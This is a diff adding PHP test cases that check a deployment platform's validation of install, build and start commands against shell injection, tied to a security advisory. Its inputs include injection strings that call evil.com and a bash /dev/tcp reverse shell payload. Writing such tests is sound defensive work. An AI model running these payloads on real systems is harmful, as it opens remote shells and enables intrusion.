@@ -672,3 +672,185 @@ describe('API route middleware for deploy actions', function () {
         expect($middleware)->toContain('api.ability:deploy');
     });
 });
+
+describe('install/build/start command validation (GHSA-9pp4-wcmj-rq73)', function () {
+    test('rejects semicolon injection in install_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => 'npm install; curl evil.com'],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects pipe injection in build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => 'npm run build | curl evil.com'],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects command substitution in start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['start_command' => 'npm start $(whoami)'],
+            ['start_command' => $rules['start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects backtick injection in install_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => 'npm install `whoami`'],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects dollar sign in build_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => 'npm run build $HOME'],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects reverse shell payload in install_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => '"; bash -i >& /dev/tcp/172.23.0.1/1337 0>&1; #'],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('rejects newline injection in start_command', function () {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['start_command' => "npm start\ncurl evil.com"],
+            ['start_command' => $rules['start_command']]
+        );
+
+        expect($validator->fails())->toBeTrue();
+    });
+
+    test('allows valid install commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['install_command' => $cmd],
+            ['install_command' => $rules['install_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'npm install',
+        'yarn install --frozen-lockfile',
+        'pip install -r requirements.txt',
+        'bun install',
+        'pnpm install --no-frozen-lockfile',
+    ]);
+
+    test('allows valid build commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['build_command' => $cmd],
+            ['build_command' => $rules['build_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'npm run build',
+        'cargo build --release',
+        'go build -o main .',
+        'yarn build && yarn postbuild',
+        'make build',
+    ]);
+
+    test('allows valid start commands', function ($cmd) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            ['start_command' => $cmd],
+            ['start_command' => $rules['start_command']]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with([
+        'npm start',
+        'node server.js',
+        'python main.py',
+        'java -jar app.jar',
+        './start.sh',
+    ]);
+
+    test('allows null values for command fields', function ($field) {
+        $rules = sharedDataApplications();
+
+        $validator = validator(
+            [$field => null],
+            [$field => $rules[$field]]
+        );
+
+        expect($validator->fails())->toBeFalse();
+    })->with(['install_command', 'build_command', 'start_command']);
+});
+
+describe('install/build/start command rules survive array_merge in controller', function () {
+    test('install_command safe regex is not overridden by local rules', function () {
+        $sharedRules = sharedDataApplications();
+
+        $localRules = [
+            'name' => 'string|max:255',
+            'docker_compose_domains' => 'array|nullable',
+        ];
+        $merged = array_merge($sharedRules, $localRules);
+
+        expect($merged['install_command'])->toBeArray();
+        expect($merged['install_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
+    });
+
+    test('build_command safe regex is not overridden by local rules', function () {
+        $sharedRules = sharedDataApplications();
+
+        $localRules = [
+            'name' => 'string|max:255',
+            'docker_compose_domains' => 'array|nullable',
+        ];
+        $merged = array_merge($sharedRules, $localRules);
+
+        expect($merged['build_command'])->toBeArray();
+        expect($merged['build_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
+    });
+
+    test('start_command safe regex is not overridden by local rules', function () {
+        $sharedRules = sharedDataApplications();
+
+        $localRules = [
+            'name' => 'string|max:255',
+            'docker_compose_domains' => 'array|nullable',
+        ];
+        $merged = array_merge($sharedRules, $localRules);
+
+        expect($merged['start_command'])->toBeArray();
+        expect($merged['start_command'])->toContain('regex:'.ValidationPatterns::SHELL_SAFE_COMMAND_PATTERN);
+    });
+});
